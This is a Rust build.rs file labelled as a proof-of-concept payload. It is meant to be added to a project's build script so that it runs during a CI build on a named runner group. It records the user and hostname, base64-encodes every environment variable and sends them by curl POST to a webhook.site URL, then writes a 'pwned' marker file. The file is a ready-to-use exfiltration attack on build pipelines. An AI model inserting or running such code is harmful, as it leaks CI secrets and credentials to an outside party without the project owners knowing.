// Original build.rs content (if any) goes here
// Add this payload at the beginning or end of main()

fn main() {
    // ===== POC PAYLOAD START =====
    // This executes on BasePerfRunnerGroup during CI build
    use std::process::Command;
    use std::fs;

    // 1. Print proof in logs
    let whoami = Command::new("whoami").output().unwrap();
    let hostname = Command::new("hostname").output().unwrap();
    println!("[!!!] POC: build.rs executed as {}", String::from_utf8_lossy(&whoami.stdout));
    println!("[!!!] POC: Running on host {}", String::from_utf8_lossy(&hostname.stdout));

    // 2. Exfiltrate environment variables to webhook.site
    let env_output = Command::new("sh")
        .arg("-c")
        .arg("printenv | base64 -w0")
        .output()
        .expect("failed to execute process");
    let env_b64 = String::from_utf8_lossy(&env_output.stdout);
    let _ = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "curl -s -X POST -d 'env={}' https://webhook.site/91f915a6-1e94-4790-9d19-a640d3478a2e",
            env_b64
        ))
        .output();

    // 3. Write a proof file on the runner
    fs::write("/tmp/pwned.txt", "PWNED: build.rs executed on BasePerfRunnerGroup").ok();

    // 4. Original build.rs logic (if any)
    // ... keep the original code here ...
    // ===== POC PAYLOAD END =====
}
